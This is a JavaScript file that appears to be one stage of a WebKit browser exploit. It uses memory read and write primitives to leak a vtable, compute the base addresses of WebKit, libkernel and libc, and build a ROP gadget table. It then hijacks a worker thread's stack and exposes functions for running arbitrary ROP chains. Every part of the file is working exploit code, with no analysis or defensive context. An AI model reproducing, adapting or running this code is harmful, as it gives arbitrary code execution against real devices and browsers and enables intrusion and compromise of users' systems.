var tarea = document.createElement('textarea');
var vt_ptr = read_ptr_at(addrof(tarea)+0x18);
var vtable = read_ptr_at(vt_ptr);

var webkit_base = read_ptr_at(vtable) - 13649280;
var libkernel_base = read_ptr_at(webkit_base + 0x28f9d70) - 0x33580;
var libc_base = read_ptr_at(webkit_base + 0x28f9d38) - 0x148f0;

var thread_list = libkernel_base + 0x601a8;
var loadall_addr = libc_base + 0x435f8;
var saveall_addr = libc_base + 0x43674;
var pivot_addr = libc_base + 0x4366e;
var infloop_addr = webkit_base + 0x109e1;
var pthread_exit_addr = libkernel_base + 0x20a80;
var pthread_create_addr = libkernel_base + 0x2d450;
var get_errno_addr_addr = libkernel_base + 0x1d2a0;

function find_worker()
{
    for(var i = read_ptr_at(thread_list); i; i = read_ptr_at(i + 0x38))
        if(read_ptr_at(i + 0xb0) == 0x80000)
            return read_ptr_at(i + 0xa8);
    return 0;
}

var spin_table = malloc(88);

//set up rdi for returning
write_ptr_at(spin_table, webkit_base+0x788fd); //pop rdi
write_ptr_at(spin_table+8, spin_table-24); //32-56

//loop waiting for commands
write_ptr_at(spin_table+16, webkit_base+0x5d293); //pop rsp
write_ptr_at(spin_table+24, spin_table+16); //will overwrite with the jump target

//[rdi+56] is here on return
write_ptr_at(spin_table+32, spin_table+40);
write_ptr_at(spin_table+40, spin_table+24); //will be popped into rdi

//restore the loop
write_ptr_at(spin_table+48, webkit_base+0x84094); //pop rax
write_ptr_at(spin_table+56, spin_table+16);
write_ptr_at(spin_table+64, webkit_base+0x1254da); //mov [rdi], rax

//loop
write_ptr_at(spin_table+72, webkit_base+0x5d293); //pop rsp
write_ptr_at(spin_table+80, spin_table);

//hijack worker's control flow
var worker_stack = find_worker();
write_ptr_at(worker_stack+0x7fb88, webkit_base+0x5d293); //pop rsp
write_ptr_at(worker_stack+0x7fb90, spin_table);

the_worker.postMessage(1); //the worker is now busy in pop rsp loop

/* PUBLIC ROP API

This function is used to execute ROP chains. `buf` is an address of the start of the ROP chain.
* first 8 bytes of `buf` should be allocated but not used -- they are used internally.
* the actual ROP chain starts at `buf+8`
* jump to `pivot_addr` to return
*/
function pivot(buf)
{
    write_ptr_at(buf, spin_table-24);
    write_ptr_at(spin_table+24, buf+8);
    var q = 0;
    while((q = read_ptr_at(spin_table+24)) != spin_table+16);
}

/* NON-BLOCKING API

These functions are the same, except that they never block.
*/
function pivot_start(buf)
{
    //returns immediately
    write_ptr_at(buf, spin_table-24);
    write_ptr_at(spin_table+24, buf+8);
}

function pivot_has_finished()
{
    return read_ptr_at(spin_table+24) == spin_table+16;
}

function pivot_cb(buf, callback)
{
    pivot_start(buf);
    var wait = function()
    {
        if(pivot_has_finished())
            callback();
        else
            setTimeout(wait, 100);
    };
    wait();
}
